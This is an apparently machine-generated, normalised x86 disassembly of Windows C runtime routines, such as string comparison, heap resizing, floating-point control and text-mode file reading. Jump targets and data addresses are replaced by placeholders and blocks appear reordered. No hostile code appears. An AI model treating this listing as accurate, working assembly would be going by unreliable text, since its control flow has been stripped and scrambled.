push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444525
mov eax [ ebp + 0x10 ]
add esp 0x18
mov esp ebp
pop ebp
retn
sub_44482c
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444703
add esp 0x18
mov esp ebp
pop ebp
retn
sub_44486d
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444380
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4448a4
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4445e3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4448d9
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4443f5
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_444910
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444642
add esp 0x14
mov esp ebp
pop ebp
retn
sub_444945
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444380
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_44497c
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4445e3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4449b1
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4443f5
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4449e8
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444642
add esp 0x14
mov esp ebp
pop ebp
retn
sub_444a1d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444483
mov eax [ ebp + 0x10 ]
add esp 0x18
pop ebp
retn
sub_444a3f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4446a1
add esp 0x18
pop ebp
retn
sub_444a5f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444525
mov eax [ ebp + 0x10 ]
add esp 0x18
pop ebp
retn
sub_444a81
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444703
add esp 0x18
pop ebp
retn
sub_444aa1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444380
mov eax [ ebp + 0xc ]
add esp 0x14
pop ebp
retn
sub_444add
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4443f5
mov eax [ ebp + 0xc ]
add esp 0x14
pop ebp
retn
sub_444b19
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444bae
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
pop edi
movzx eax si
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_444bae
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_41cbf0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0xc ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_444f48
lea ecx [ ebp - 0xc ]
movzx edi ax
movzx eax [ esi ]
lea ebx [ ebx + 0x2 ]
push ecx
push eax
call sub_444f48
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_444c8e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
sub_444cc1
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
sub_444cf4
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_42d3eb
pop ecx
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
push edi
call sub_42d3b1
pop ecx
jmp r-xdata
pop edi
pop ebp
retn
push esi
push edi
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
test eax eax
je r-xdata
call sub_430f56
mov [ eax ] 0xc
xor eax eax
call sub_42cac5
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_429937
pop ecx
test eax eax
je r-xdata
pop esi
sub_444d7e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
push esi
jl r-xdata
xor esi esi
call sub_444dd8
mov edx [ ebp + 0xc ]
mov esi eax
mov ecx [ ebp + 0x8 ]
not edx
and ecx [ ebp + 0xc ]
or edx 0xffff807f
and edx esi
or edx ecx
push edx
call sub_444df6
pop ecx
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_444dd8
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jl r-xdata
xor eax eax
stmxcsr [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_444df6
push 0x8
push r--data
call sub_40d270
cmp [ rw-data ] 0x1
jl r-xdata
call sub_40d2b6
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_444eaf
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
not ecx
and cx [ ebp - 0x4 ]
and eax [ ebp + 0xc ]
or cx ax
mov [ ebp - 0x8 ] cx
fldcw [ ebp - 0x8 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_444edb
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ r--data ]
fistp [ ebp - 0x4 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ r--data ]
fstp [ ebp - 0xc ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ r--data ]
fstp [ ebp - 0xc ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
mov esp ebp
pop ebp
retn
fldpi
fstp [ ebp - 0xc ]
fwait
sub_444f48
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x18
cmp [ ebp + 0x8 ] ax
je r-xdata
mov esp ebp
pop ebp
retn
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_41cbf0
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_446ee4
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
mov [ ebp - 0x8 ] eax
jmp r-xdata
add cx 0x20
movzx eax cx
mov [ ebp - 0x8 ] eax
mov cx ax
mov ax [ ebp - 0x4 ]
mov ax [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
movzx eax [ eax + ecx ]
mov ax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax ax
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax ax
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_445030
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_445091
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
push ebx
push edi
call sub_42f7dc
neg eax
sbb ebx ebx
xor edi edi
push edi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
inc ebx
mov [ esi ] edi
push edi
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
add eax eax
push eax
call sub_42d3eb
mov esi eax
pop ecx
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_430f20
xor eax eax
jmp r-xdata
pop esi
push esi
call sub_42d3b1
mov eax edi
push [ ebp - 0x4 ]
push esi
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
pop ecx
pop edi
pop ebx
mov ecx [ ebp + 0xc ]
mov eax esi
mov esi edi
xor edi edi
inc edi
mov [ ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_430f20
pop ecx
jmp r-xdata
sub_445158
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
push edi
call sub_42f7dc
push [ ebp + 0x8 ]
neg eax
sbb edi edi
and [ esi ] 0x0
inc edi
push edi
call sub_42ad2b
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
push eax
call sub_42d3eb
mov esi eax
pop ecx
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_430f20
xor eax eax
jmp r-xdata
pop esi
xor edi edi
push [ ebp - 0x4 ]
push esi
push [ ebp + 0x8 ]
push edi
call sub_42ad64
add esp 0x10
test eax eax
jne r-xdata
pop ecx
pop edi
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax esi
mov esi edi
inc edi
mov [ ecx ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_430f20
pop ecx
push esi
call sub_42d3b1
mov eax edi
sub_445214
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438cfe
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0xc ]
mov eax [ edi ]
mov esi [ eax ]
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_430f56
push 0x9
pop esi
mov [ eax ] esi
mov eax [ edi + 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
push esi
call sub_44536f
add esp 0xc
mov esi eax
jmp r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445290
mov eax esi
call sub_40d2b6
retn 0xc
sub_44529c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_445214
mov esp ebp
pop ebp
retn
sub_4452fe
mov eax [ ecx ]
push esi
push edi
mov edi [ eax ]
mov eax edi
and eax 0x3f
mov esi edi
sar esi 0x6
imul edx eax 0x30
mov eax [ esi * 4 + rw-data ]
test [ eax + edx + 0x28 ] 0x1
je r-xdata
call sub_430f56
push 0x9
pop ecx
mov [ eax ] ecx
mov eax ecx
mov eax [ ecx + 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
push edi
call sub_44536f
add esp 0xc
jmp r-xdata
pop edi
pop esi
retn
sub_445353
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_445500
add esp 0xc
neg eax
sbb eax eax
pop ebp
retn
sub_44536f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
call sub_43ed63
mov ecx eax
mov [ ebp - 0x10 ] eax
and ecx edx
mov [ ebp - 0xc ] edx
add esp 0x10
cmp ecx 0xffffffff
jne r-xdata
push 0x2
push esi
push esi
push edi
call sub_43ed63
mov ecx eax
add esp 0x10
and ecx edx
cmp ecx 0xffffffff
je r-xdata
call sub_430f56
mov eax [ eax ]
jmp r-xdata
push ebx
mov ebx [ ebp + 0xc ]
sub ebx eax
mov eax [ ebp + 0x10 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp eax esi
jg r-xdata
jg r-xdata
push esi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push edi
call sub_43ed63
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
jl r-xdata
push 0x1
push 0x1000
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
cmp ebx esi
jbe r-xdata
xor eax eax
call sub_430f56
mov eax [ eax ]
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_43ed63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp ebx esi
jae r-xdata
push 0x8000
push edi
call sub_42b251
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_430f56
mov [ eax ] 0xc
jmp r-xdata
pop ebx
push edi
call sub_438f7b
pop ecx
push eax
call [ SetEndOfFile@IAT ]
test eax eax
jne r-xdata
mov eax ebx
jg r-xdata
call sub_430f56
push esi
mov edi [ eax ]
call sub_42d3b1
pop ecx
mov eax edi
jmp r-xdata
call sub_430f56
mov [ eax ] 0xd
call sub_430f43
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
jmp r-xdata
call sub_430f43
cmp [ eax ] 0x5
jne r-xdata
cdq
sub ebx eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
test eax eax
jg r-xdata
mov eax 0x1000
jmp r-xdata
cmp ebx 0x1000
jb r-xdata
call sub_430f56
mov [ eax ] 0xd
jl r-xdata
push eax
push esi
push edi
call sub_4328cc
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push edi
call sub_42b251
push esi
call sub_42d3b1
add esp 0xc
xor esi esi
test ebx ebx
jne r-xdata
test eax eax
jl r-xdata
sub_445500
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_430f43
push 0x9
and [ eax ] 0x0
pop eax
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
push 0x9
cmp esi [ rw-data ]
jae r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call sub_44529c
pop ecx
pop ecx
jmp r-xdata
jl r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
push 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jae r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
sub_44559b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
and eax 0x3f
mov edx [ ebp + 0xc ]
push ebx
sar ecx 0x6
push esi
push edi
imul edi eax 0x30
mov eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
and [ eax + edi + 0x28 ] 0xfb
cmp [ edx ] 0xa
jne r-xdata
sub esi edx
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edx + 0x1 ]
or [ eax + edi + 0x28 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + edi + 0x28 ]
test al 0x40
jne r-xdata
cmp cl 0xd
je r-xdata
lea eax [ edx + ecx ]
mov ebx edx
mov [ ebp - 0x8 ] eax
mov esi edx
cmp edx eax
jae r-xdata
mov cl [ ebx ]
mov [ esi ] cl
inc esi
or al 0x2
mov [ ecx + edi + 0x28 ] al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
jae r-xdata
mov [ esi ] cl
inc esi
inc ebx
inc eax
jmp r-xdata
inc ebx
inc eax
push 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp - 0x14 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ esi ] 0xd
inc esi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ esi ] 0xd
inc esi
inc ebx
inc eax
jmp r-xdata
add ebx 0x2
mov [ esi ] 0xa
add eax 0x2
inc esi
jmp r-xdata
mov cl [ ebx ]
cmp cl 0x1a
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov eax [ ecx * 4 + rw-data ]
test [ eax + edi + 0x28 ] 0x48
je r-xdata
cmp ebx ecx
jb r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov dl [ ebp - 0x1 ]
cmp dl 0xa
jne r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_43ed63
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov edx [ ebp + 0xc ]
cmp esi edx
jne r-xdata
mov [ esi ] 0xd
mov eax [ ecx * 4 + rw-data ]
mov [ eax + edi + 0x2a ] dl
jmp r-xdata
mov [ esi ] dl
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] 0xa
inc esi
jmp r-xdata
mov eax [ ebp - 0xc ]
sub_4456f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
and eax 0x3f
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
sar ecx 0x6
imul edi eax 0x30
mov [ ebp - 0x8 ] ecx
push 0xa
mov eax [ ecx * 4 + rw-data ]
pop ebx
mov edx [ eax + edi + 0x18 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0xc ]
test esi esi
je r-xdata
and [ eax + edi + 0x28 ] 0xfb
cmp [ edx ] bx
jne r-xdata
sub esi edx
and esi 0xfffffffe
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edx + 0x2 ]
or [ eax + edi + 0x28 ] 0x4
jmp r-xdata
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + edi + 0x28 ]
test al 0x40
jne r-xdata
push 0xd
pop edx
cmp [ ebp - 0xc ] dx
mov edx [ ebp + 0xc ]
je r-xdata
lea eax [ edx + esi * 2 ]
mov ebx edx
mov [ ebp - 0x10 ] eax
mov esi edx
cmp edx eax
jae r-xdata
mov cx [ ebx ]
mov [ esi ] cx
add esi 0x2
or al 0x2
mov [ ecx + edi + 0x28 ] al
jmp r-xdata
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
add ebx 0x2
mov [ esi ] cx
add esi 0x2
add eax 0x2
jmp r-xdata
add eax 0x2
add ebx 0x2
push 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x14 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0xa
pop edx
cmp [ eax ] dx
mov edx [ ebp + 0xc ]
jne r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
push 0xd
pop eax
mov [ esi ] ax
add esi 0x2
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xd
pop edx
mov [ esi ] dx
add ebx 0x2
add esi 0x2
add eax 0x2
jmp r-xdata
push 0xa
pop ecx
add ebx 0x4
mov [ esi ] cx
add eax 0x4
add esi 0x2
jmp r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0xc ] ecx
cmp ecx 0x1a
mov ecx [ ebp - 0x8 ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push 0xa
mov eax [ ecx * 4 + rw-data ]
test [ eax + edi + 0x28 ] 0x48
pop eax
je r-xdata
mov edx [ ebp + 0xc ]
cmp [ ebp - 0x4 ] ax
jne r-xdata
mov dx [ ebp - 0x4 ]
cmp dx ax
jne r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_43ed63
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x4 ] ax
je r-xdata
mov edx [ ebp + 0xc ]
cmp esi edx
jne r-xdata
push 0xd
pop eax
mov [ esi ] ax
mov eax [ ecx * 4 + rw-data ]
push 0xa
mov [ eax + edi + 0x2a ] dl
mov eax [ ecx * 4 + rw-data ]
mov [ eax + edi + 0x2b ] dh
mov eax [ ecx * 4 + rw-data ]
pop edx
mov [ eax + edi + 0x2c ] dl
jmp r-xdata
mov [ esi ] ax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] ax
add esi 0x2
mov eax [ ebp - 0xc ]
jmp r-xdata
sub_4458b2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov al [ ebp + 0xc ]
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x2a ] al
pop ebp
retn
sub_4458d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
push esi
mov esi eax
and eax 0x3f
sar esi 0x6
imul edx eax 0x30
mov eax [ esi * 4 + rw-data ]
mov [ eax + edx + 0x2a ] cl
mov eax [ esi * 4 + rw-data ]
